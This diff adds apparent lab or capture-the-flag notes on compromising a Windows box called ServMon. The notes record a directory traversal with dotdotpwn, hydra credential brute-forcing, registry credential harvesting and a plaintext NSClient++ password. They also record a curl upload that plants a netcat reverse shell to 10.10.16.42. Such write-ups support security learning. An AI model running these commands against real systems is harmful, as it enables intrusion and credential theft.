@@ -1,0 +1,95 @@
+* ServMon
+** enumeration
+   nmap:
+*** 21 - ftp
+
+Anonymous login allowed via user 'ftp'. But most commands return 550 access denied
+Stupidly didn't descend into the directory structure! There's a Confidential note about a password file
+
+*** 22 - ssh
+*** 80 - http
+    
+NVMS-1000 login page
+
+**** gobuster
+
+seems to be reporting 200 for every query, but I'm recording sizes and will look for anomalies
+
+*** 135 - rpc
+
+~rpcdump.py~ (from impacket) gives 361 endpoints, but not sure what to do with this info    
+
+*** 139 - netbios
+
+samba?
+
+~smbclient -L //$TARGET/ responds but prompts for a password    
+
+*** 5666 - ??
+
+Immediately closes connection    
+
+*** 6699 - ??
+    
+Holds the connection open briefly and accepts input, but gives no response
+
+*** 8443 - https-alt
+
+Something called NSClient++
+
+**** gobuster
+/api/ 403
+/metrics/ 403
+
+fuzz /api/?
+
+https://docs.nsclient.org/api/
+
+Seems to be a lot of chatter about default passwords being a problem with NSClient, but none seem to work for me
+   
+** foothold
+
+NVMS-1000 is vuln to directory traversal, used
+
+~dotdotpwn -h $TARGET -m http -f /Users/Nathan/Desktop/Passwords.txt -sqb~
+
+Given these passwords, I used ~hydra~ to attempt to use them against ftp/ssh
+
+GOT: nadine's ssh creds / user.txt
+
+** escalation
+
+Download winPEASany.exe with powershell:
+
+~(New-Object System.Net.WebClient).DownloadFile($url, $output)~
+
+winPEAS highlights:
+ * Permissions: Authenticated Users [AppendData/CreateDirectories])
+ * EnableLUA != 1, UAC policies disabled. [+] Any local account can be used for lateral movement.
+ * [+] Looking for AutoLogon credentials(T1012)                                                
+    Some AutoLogon credentials were found!!                                                   
+    DefaultDomainName             :  SERVMON                                                  
+    DefaultUserName               :  Nathan
+ *   [+] Looking AppCmd.exe()                                                                    
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe                                                                                
+    AppCmd.exe was found in C:\WINDOWS\system32\inetsrv\appcmd.exe You should try to se       
+arch for credentials 
+
+~reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'~
+
+Grab the NSClient password
+
+PS C:\Program Files\NSClient++> ./nscp web password --display
+Current password: ew2x6SsGTxjRwXOT
+
+Unfortunately, the nsclient rejects passwords except from localhost:
+ * use ~chisel~ to forward localhost:8443 to $TARGET:8443
+
+Upload an attack script:
+~curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/attack.bat --data-binary 'C:\Temp\nc.exe 10.10.16.42 443 -e cmd.exe'~
+
+Then in console, execute command ~attack~
+
+Got reverse shell with root.
+
+** post-exploitation
